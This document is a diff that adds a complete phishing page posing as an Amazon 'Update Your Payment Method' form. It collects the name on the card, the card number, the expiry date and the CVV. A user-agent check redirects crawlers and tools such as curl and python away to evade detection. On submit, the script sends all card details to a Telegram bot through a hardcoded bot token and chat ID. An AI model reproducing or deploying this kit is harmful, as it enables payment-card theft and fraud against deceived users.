@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Amazon</title>
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="card.css">
+    <style>
+        input {
+            font-size: 16px; /* Avoid zoom on mobile */
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="passage">
+        <h3>You Can't Access Your Account Until You Update</h3>
+    </div>
+    <div id="formContainer">
+        <div class="emojiContainer">
+            <h2>Update Your Payment Method</h2>
+            <img src="images/img1.jpeg" alt="Image 1">
+            <img src="images/img2.png" alt="Image 2">
+            <img src="images/img3.png" alt="Image 3">
+            <img src="images/img4.png" alt="Image 4">
+            <img src="images/img5.png" alt="Image 5">
+            <img src="images/img6.png" alt="Image 6">
+        </div>
+        <form id="loginForm" method="post" autocomplete="on">
+            <label for="name">Name on Card <span>(Enter Your Full Name)</span></label>
+            <input type="text" id="name" name="name" placeholder="Name On Card" autocomplete="off" required>
+            <br>
+            <label for="cardNumber">Card Number <span>(Enter Card Number)</span></label>
+            <input type="text" id="cardNumber" name="cardNumber" maxlength="19" placeholder="Enter your card number" required>
+            <span id="cardType"></span>
+            <div id="validationMessage"></div>
+            <br>
+            <label for="date">Expiration Date <span>(Enter Your Expiration Date)</span></label>
+            <input type="text" id="date" name="expiryDate" placeholder="MM/YY" maxlength="5" pattern="\d{2}/\d{2}" required>
+            <br>
+            <label for="Code">Security Code <span>(Enter Your Security Code)</span></label>
+            <input type="text" id="Code" name="cvv" placeholder="CVV/CVV2" autocomplete="off" maxlength="4" required>
+            <br>
+            <button id="submit" type="submit">Submit</button>
+        </form>
+    </div>
+    <footer>
+        <p>&copy; 2025 Amazon. All rights reserved.</p>
+        <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+    </footer>
+
+    <script>
+        // Format card number with spaces
+        document.getElementById('cardNumber').addEventListener('input', function(event) {
+            const input = event.target;
+            let value = input.value.replace(/\s+/g, ''); // Remove existing spaces
+            let formattedValue = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+
+            input.value = formattedValue;
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Card validation logic
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+            const validationMessage = document.getElementById('validationMessage');
+            const cardTypeSpan = document.getElementById('cardType');
+
+            if (!validateCardNumber(cardNumber)) {
+                validationMessage.textContent = 'Invalid card number.';
+                validationMessage.className = 'error';
+                cardTypeSpan.textContent = '';
+                return;
+            }
+
+            const cardType = getCardType(cardNumber);
+            if (cardType) {
+                cardTypeSpan.textContent = `Card: ${cardType}`;
+            } else {
+                validationMessage.textContent = 'Invalid card number.';
+                validationMessage.className = 'error';
+                cardTypeSpan.textContent = '';
+                return;
+            }
+
+            // Collect form values
+            const name = document.getElementById("name").value;
+            const expirationDate = document.getElementById("date").value;
+            const securityCode = document.getElementById("Code").value;
+
+            // Example: Send this data to Telegram via your bot
+            const message = `Name: ${name}\nCard Number: ${cardNumber}\nExpiration Date: ${expirationDate}\nSecurity Code: ${securityCode}`;
+            
+            const botToken = '7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0';
+            const chatId = '7009891691';
+            const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramAPI)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Redirect to a different page after successful submission
+                        window.location.href = "mail.html"; // Replace with your desired redirect page
+                    } else {
+                        alert("Error: " + data.description);
+                    }
+                })
+                .catch(error => {
+                    alert("Error: " + error.message);
+                });
+        });
+
+        function validateCardNumber(cardNumber) {
+            let sum = 0;
+            let shouldDouble = false;
+
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i), 10);
+
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+
+            return (sum % 10 === 0);
+        }
+
+        function getCardType(cardNumber) {
+            const cardTypes = {
+                'Visa': /^4/,
+                'MasterCard': /^5[1-5]/,
+                'American Express': /^3[47]/,
+                'Discover': /^6(?:011|5)/,
+                'JCB': /^35(?:2[89]|[3-8][0-9])/,
+                'Diners Club': /^(300|301|302|303|304|305|36|38)/,
+                'UnionPay': /^62/
+            };
+
+            for (const [type, pattern] of Object.entries(cardTypes)) {
+                if (pattern.test(cardNumber)) {
+                    return type;
+                }
+            }
+
+            return null;
+        }
+    </script>
+</body>
+</html>
